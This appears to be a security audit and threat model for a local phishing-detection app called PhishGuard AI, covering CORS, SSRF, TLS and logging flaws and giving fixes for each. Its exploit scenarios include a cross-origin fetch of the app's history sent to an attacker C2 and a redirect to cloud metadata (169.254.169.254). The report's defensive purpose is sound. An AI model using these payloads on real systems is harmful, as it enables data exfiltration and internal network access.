# PhishGuard AI — Cybersecurity Risk Assessment & Threat Model

## 1. Confirmed Vulnerability Findings

### Vulnerability 1: Denial of Service via Async Event Loop Starvation
- **Vulnerability ID:** `VULN-PG-01`
- **Severity:** **HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H — Score: 7.5)**
- **Component:** `backend/app/api/routes/predict.py` (`predict_url`) & `backend/app/services/detection_engine.py` (`fetch_single_html`)
- **Vulnerability Type:** CWE-400: Uncontrolled Resource Consumption / Event Loop Blocking

#### Technical Mechanics & Evidence
In `predict.py`, the endpoint is declared as an asynchronous coroutine:
```python
@router.post("/api/analyze")
async def predict_url(payload: PredictRequest, engine: DetectionEngine = Depends(get_detection_engine)):
    result = engine.analyze_url(url=payload.url, fetch_html=fetch_flag)
```
Inside `analyze_url()`, the engine invokes:
```python
fetch_ok, content, err_reason, ssl_flag = self.fetch_single_html(normalized_url)
```
Which executes blocking synchronous network operations:
```python
addr_info = socket.getaddrinfo(clean_host, None)   # Synchronous OS DNS lookup
response = self.session.get(url, timeout=8.0, ...) # Synchronous requests.get
```
Because this synchronous function runs directly inside the single-threaded asyncio event loop of Uvicorn, **the entire thread is frozen** while awaiting DNS resolution or TCP timeouts.

#### Empirical Proof
Observed during test scenario TC-09 ([03_FUNCTIONALITY_AND_TEST_RESULTS.md](file:///c:/Users/Udhaya/S5_Phishing_Detector/PROJECT_AUDIT_REPORT/03_FUNCTIONALITY_AND_TEST_RESULTS.md)):
- A request to an unresolvable hostname blocked the worker for 10 seconds.
- Concurrent requests (TC-10) queued behind it were completely starved of CPU cycles and timed out before being serviced.

#### Remediation
Either declare the route as a standard synchronous function (allowing FastAPI to automatically offload it to an internal threadpool):
```python
@router.post("/api/analyze")
def predict_url(...):  # Non-async: runs in starlette threadpool
```
Or refactor `fetch_single_html` to use non-blocking asynchronous I/O via `httpx.AsyncClient` with an asynchronous DNS resolver (e.g. `aiozone` or `aiodns`).

---

### Vulnerability 2: Unauthenticated Local API Information Disclosure via Wildcard CORS
- **Vulnerability ID:** `VULN-PG-02`
- **Severity:** **MEDIUM (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N — Score: 6.5)**
- **Component:** `backend/app/main.py` (CORS middleware) & `backend/app/api/routes/predict.py` (`/api/history`)
- **Vulnerability Type:** CWE-942: Overly Permissive Cross-Domain Whitelist

#### Technical Mechanics & Evidence
In `backend/app/main.py`:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)
```
In `backend/app/api/routes/predict.py`:
```python
@router.get("/api/history", response_model=List[Dict[str, Any]])
async def get_history(limit: int = 50, status: Optional[str] = None):
    return history_svc.get_history(limit=limit, status_filter=status)
```
The `/api/history` endpoint requires **no authentication token, session cookie, or API key**, and CORS allows all origins (`"*"`) without restriction.

#### Exploit Scenario
1. A victim user browses the web while running PhishGuard AI locally.
2. The user visits an arbitrary third-party website (e.g., `https://attacker-blog.org`).
3. An invisible script on the attacker's page executes:
   ```javascript
   fetch('http://127.0.0.1:8000/api/history')
     .then(res => res.json())
     .then(data => sendToAttackerC2(data));
   ```
4. The browser happily sends the cross-origin request because the local server responds with `Access-Control-Allow-Origin: *`.
5. The attacker successfully exfiltrates the user's complete history of scanned URLs, timestamps, risk classifications, and internal parameters.

#### Remediation
1. Remove wildcard CORS in `main.py`. Restrict allowed origins strictly to the local dashboard origin (`http://localhost:5173`, `http://127.0.0.1:5173`) and the specific Chrome extension ID (`chrome-extension://<EXTENSION_ID>`).
2. Implement a local session secret or API bearer token required for reading or clearing the history endpoint.

---

### Vulnerability 3: SSRF Perimeter Bypass via HTTP 302 Redirects & DNS Rebinding
- **Vulnerability ID:** `VULN-PG-03`
- **Severity:** **HIGH (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N — Score: 7.2)**
- **Component:** `backend/app/services/detection_engine.py` (`is_safe_ssrf_destination` & `fetch_single_html`)
- **Vulnerability Type:** CWE-918: Server-Side Request Forgery (SSRF)

#### Technical Mechanics & Evidence
The SSRF validation logic in `detection_engine.py` is executed **only once** before the request begins:
```python
# Lines 210-214: Validates initial hostname
parsed = urllib.parse.urlsplit(url)
is_safe, ssrf_err = is_safe_ssrf_destination(parsed.hostname or "")
if not is_safe:
    return False, None, ssrf_err, False

# Lines 226-233: Executes request with automatic redirects enabled!
response = self.session.get(
    url,
    headers=headers,
    timeout=self.fetch_timeout,
    stream=True,
    verify=False,
    allow_redirects=True,  # <--- CRITICAL FLAW
)
```

#### Exploit Scenario
1. Attacker sets up a public web server at `http://evil-redirector.com/forward`.
2. When PhishGuard checks `evil-redirector.com`, `is_safe_ssrf_destination` resolves it to a public IP (e.g., `203.0.113.5`) and approves the request.
3. The server at `evil-redirector.com` responds with an HTTP 302 redirect:
   ```http
   HTTP/1.1 302 Found
   Location: http://169.254.169.254/latest/meta-data/
   ```
4. Python `requests.get()` follows the redirect automatically. The second destination (`169.254.169.254` or `127.0.0.1`) **is never checked by the SSRF filter**.
5. The backend fetches cloud instance metadata or internal intranet services, reading the first 2 MB of data and parsing it into DOM features.

Furthermore, a **DNS Rebinding** attack can exploit the Time-of-Check to Time-of-Use (TOCTOU) gap between `socket.getaddrinfo()` in `is_safe_ssrf_destination` and the independent socket resolution inside `requests.get()`.

#### Remediation
1. Disable automatic redirects: `allow_redirects=False`.
2. Intercept 3xx responses manually in a loop (up to a max hop count of 3), re-running `is_safe_ssrf_destination` against the `Location` header host before following each hop.
3. For maximum hardening, pin the socket connection directly to the verified IP address rather than re-resolving the hostname via DNS.

---

### Vulnerability 4: Disabled SSL/TLS Certificate Verification in Live Fetcher
- **Vulnerability ID:** `VULN-PG-04`
- **Severity:** **MEDIUM (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N — Score: 5.3)**
- **Component:** `backend/app/services/detection_engine.py` (Line 231)
- **Vulnerability Type:** CWE-295: Improper Certificate Validation

#### Technical Mechanics & Evidence
In `detection_engine.py`:
```python
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
...
response = self.session.get(
    url,
    verify=False,  # Disables certificate validation
    ...
)
```
The codebase explicitly comments:
`# Suppress insecure HTTPS connection warnings for live phishing domain inspection`

While the intent is understandable (many live phishing domains use expired or self-signed certificates and the auditor wants to inspect their HTML anyway), setting `verify=False` globally causes two serious security side effects:
1. An attacker on the local network path (e.g., coffee shop Wi-Fi or compromised LAN) can Man-in-the-Middle (MitM) the scanner itself, feeding fake benign HTML for malicious URLs.
2. The indicator generator check (`if ssl_error: indicators.append(...)`) **will almost never fire**, because `SSLError` is suppressed by `verify=False`!

#### Remediation
Perform certificate validation in a two-stage approach:
1. Attempt a standard verified TLS handshake (`verify=True`).
2. If `requests.exceptions.SSLError` is caught, record a high-severity `ssl_error = True` threat indicator.
3. Only then, optionally retry with `verify=False` in degraded mode to inspect the underlying DOM.

---

### Vulnerability 5: Sensitive URL & Authentication Token Retention in Logs & History
- **Vulnerability ID:** `VULN-PG-05`
- **Severity:** **LOW / MEDIUM (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Score: 4.3)**
- **Component:** `backend/app/api/routes/predict.py` (Line 69) & `backend/app/services/history_service.py`
- **Vulnerability Type:** CWE-532: Insertion of Sensitive Information into Log File

#### Technical Mechanics & Evidence
In `predict.py`:
```python
logger.exception("Unexpected error during URL prediction for '%s': %s", payload.url, exc)
```
If a user scans a URL containing sensitive reset tokens, passwords, or OAuth state parameters:
`https://service.com/reset-password?token=eyJhbGciOi...`
The entire raw URL with query parameters is written directly to the application log in plaintext.
Similarly, `HistoryService` stores `{"url": payload.url}` unredacted in memory and returns it to `/api/history`.

#### Remediation
Sanitize input URLs before logging or saving into telemetry history by stripping or redacting query parameter values (e.g. replacing parameter values with `[REDACTED]`).

---

## 2. Threat Model & Attack Scenarios

### Threat Matrix

| Threat Actor | Motivation | Attack Vector | System Impact |
| :--- | :--- | :--- | :--- |
| **Phishing Kit Operator** | Evade PhishGuard detection | Hosts lure on trusted PaaS (Canva / Microsoft Forms) or obfuscates DOM with client-side React. | **High:** PhishGuard static parser sees benign/empty DOM and classifies site as Safe or Bounded. |
| **Malicious Webmaster** | Disrupt scanning infrastructure | Delivers infinite redirect chains or unresolvable DNS queries to cause event loop starvation. | **High:** Entire local scanner freezes, failing open for the user. |
| **Network Attacker (LAN)** | Deceive the security scanner | MitM intercept of unverified `requests.get(verify=False)` traffic to forge benign HTML responses. | **Medium:** Attacker bypasses live HTML detection. |
| **Malicious Web Page** | Spy on user browsing history | Cross-origin `fetch('http://127.0.0.1:8000/api/history')` via wildcard CORS. | **High:** Full exfiltration of user's scanned URLs and security audits. |

---

## 3. Browser Extension Security & Permission Analysis

### Manifest V3 Declarations (`extension/manifest.json`)
```json
{
  "manifest_version": 3,
  "permissions": [
    "activeTab",
    "storage"
  ],
  "host_permissions": [
    "http://127.0.0.1:8000/*",
    "http://localhost:8000/*",
    "http://*/*",
    "https://*/*"
  ]
}
```

### Audit Findings
1. **Excessive Host Permissions (`http://*/*`, `https://*/*`):**  
   The extension requests full access to every web origin on the internet in `host_permissions`. However, the extension **never injects content scripts** or modifies web pages! The only hosts the extension actually talks to over `fetch()` are `http://127.0.0.1:8000/*` and `http://localhost:8000/*`.
   - `http://*/*` and `https://*/*` are completely unnecessary and trigger severe Chrome Web Store security review friction.
2. **Minimal Principle Adherence:**  
   The extension appropriately requests `activeTab` instead of the broad `tabs` permission, which is good practice for privacy.
3. **Absence of Blocking APIs:**  
   It lacks `declarativeNetRequest` and `webNavigation`, confirming that the extension was never architected to block web traffic.
